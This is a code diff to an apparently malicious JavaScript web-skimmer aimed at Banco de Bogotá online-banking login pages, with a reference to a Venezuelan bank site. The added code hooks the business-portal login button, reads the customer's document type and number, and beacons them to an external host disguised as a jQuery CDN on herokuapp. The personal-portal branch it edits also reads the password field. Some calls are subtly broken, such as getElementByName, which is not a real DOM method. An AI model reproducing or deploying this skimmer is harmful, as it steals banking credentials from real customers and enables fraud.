@@ -9,13 +9,31 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
-if (top['location']['href']['indexOf']('bancodebogota.com') > -1) {
+
+if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/empresas/') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('cont-personas')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('btn-ingreso-empresas')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:tipoDocumento");
+              var select = option.options[option.selectedIndex].value;
+              var login = {};
+                  login.documentNumber = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:numeroDocumento")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.documentNumber;
+            }
+        }
+    }, 1000)
+};
+
+
+
+if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/personas/') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('cont-personas')[0]) {
             clearInterval(interval);
             document['getElementsByClassName']('cont-ingreso-seguro')[0].onclick = function (_0x441cx2) {
               var option = document.getElementByName("documentType");
-              var select = option.options[option.selectedIndex].text;
+              var select = option.options[option.selectedIndex].value;
               var login = {};
                   login.documentNumber = document.getElementsByName("documentNumber")[0].value;
                   login.pass = document.getElementsByName("password")[0].value;
@@ -27,8 +45,6 @@ if (top['location']['href']['indexOf']('bancodebogota.com') > -1) {
         }
     }, 1000)
 };
-
-
 
 
 if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
